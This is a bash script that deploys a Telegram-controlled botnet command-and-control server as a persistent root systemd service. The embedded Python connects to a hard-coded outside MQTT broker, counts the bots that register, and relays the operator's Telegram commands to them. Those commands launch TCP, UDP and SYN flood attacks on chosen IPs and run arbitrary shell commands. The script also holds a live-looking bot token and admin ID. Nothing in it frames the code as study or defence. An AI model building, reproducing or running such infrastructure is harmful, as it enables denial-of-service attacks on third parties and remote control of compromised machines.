#!/bin/bash
# deploy_pure_tg_c2.sh
TOKEN="8404427083:AAEr0y_vDzAzvMRtZZ_mCxhzGXDiJFKS0XYe"
ADMIN_ID="5699538596"

cat > /opt/pure_tg_c2.py << EOF
#!/usr/bin/env python3
import telebot, json, paho.mqtt.client as mqtt, threading
from telebot import types

TOKEN = '$TOKEN'
ADMIN_ID = $ADMIN_ID
bot = telebot.TeleBot(TOKEN)

# MQTT per bots (NO HTTP 6667)
mqttc = mqtt.Client()
brokers = {}  # {broker_id: client_count}
total_bots = 0

def on_mqtt_connect(client, userdata, flags, rc):
    print("✅ MQTT C2 conectado")
    mqttc.subscribe("c2/register")
    mqttc.subscribe("c2/stats")

def on_mqtt_message(client, userdata, msg):
    global total_bots
    data = json.loads(msg.payload)
    
    if msg.topic == "c2/register":
        broker_id = data['broker_id']
        brokers[broker_id] = data['clients']
        total_bots += data['clients']
        print(f"✅ REGISTER {broker_id}: {data['clients']} bots")
    
    elif msg.topic == "c2/stats":
        broker_id = data['broker_id']
        brokers[broker_id] = data['clients']

def broadcast_cmd(cmd_type, target, port):
    payload = json.dumps({"cmd":cmd_type, "target":target, "port":port})
    mqttc.publish("c2/cmd", payload)
    print(f"📤 BROADCAST {cmd_type} {target}:{port}")

@bot.message_handler(commands=['start'])
def start(msg):
    if str(msg.chat.id) != ADMIN_ID:
        bot.reply_to(msg, "❌ ACCESSO NEGATO")
        return
    
    markup = types.InlineKeyboardMarkup()
    btn_stats = types.InlineKeyboardButton("📊 STATS", callback_data="stats")
    btn_brokers = types.InlineKeyboardButton("📋 BROKERS", callback_data="brokers")
    markup.add(btn_stats, btn_brokers)
    
    bot.send_message(msg.chat.id, """
🚀 **PURE TG C2 - MQTT ONLY**

Comandi:
/stats - Statistiche live
/brokers - Lista broker
/ddos_tcp IP PORT
/ddos_udp IP PORT  
/syn IP PORT
/shell CMD

👥 Admin ID: $ADMIN_ID ✅
    """, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def stats(msg):
    if str(msg.chat.id) != ADMIN_ID: return
    bot.reply_to(msg, f"📊 **LIVE STATS**\n📡 Brokers: {len(brokers)}\n🤖 Bots: {total_bots}")

@bot.message_handler(commands=['brokers'])
def brokers(msg):
    if str(msg.chat.id) != ADMIN_ID: return
    txt = "📋 **BROKERS LIVE:**\n"
    for bid, count in brokers.items():
        txt += f"• `{bid}`: {count} bots\n"
    bot.reply_to(msg, txt, parse_mode='Markdown')

@bot.message_handler(regexp=r'^/(ddos_tcp|ddos_udp|syn)\s+(\S+)\s+(\d+)$')
def ddos_handler(msg):
    if str(msg.chat.id) != ADMIN_ID: return
    
    cmd, ip, port = msg.text.split()[0][1:], msg.text.split()[1], int(msg.text.split()[2])
    broadcast_cmd(cmd, ip, port)
    bot.reply_to(msg, f"✅ **{cmd.upper()}** `{ip}:{port}` → {len(brokers)} brokers")

@bot.message_handler(commands=['shell'])
def shell(msg):
    if str(msg.chat.id) != ADMIN_ID: return
    cmd = msg.text[7:]
    mqttc.publish("c2/shell", json.dumps({"cmd":cmd}))
    bot.reply_to(msg, f"🖥️ **SHELL** → `{cmd}`")

def mqtt_loop():
    mqttc.on_connect = on_mqtt_connect
    mqttc.on_message = on_mqtt_message
    mqttc.connect("67.218.246.15", 1883, 60)
    mqttc.loop_forever()

if __name__ == "__main__":
    print("🚀 PURE TG C2 START - Admin:", ADMIN_ID)
    threading.Thread(target=mqtt_loop, daemon=True).start()
    bot.polling(none_stop=True)
EOF

chmod +x /opt/pure_tg_c2.py

cat > /etc/systemd/system/pure-tg-c2.service << EOF
[Unit]
Description=Pure TG C2 MQTT
After=network.target

[Service]
ExecStart=/opt/pure_tg_c2.py
WorkingDirectory=/opt
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload && systemctl enable pure-tg-c2 && systemctl start pure-tg-c2
echo "✅ PURE TG C2 LIVE - Telegram /start"
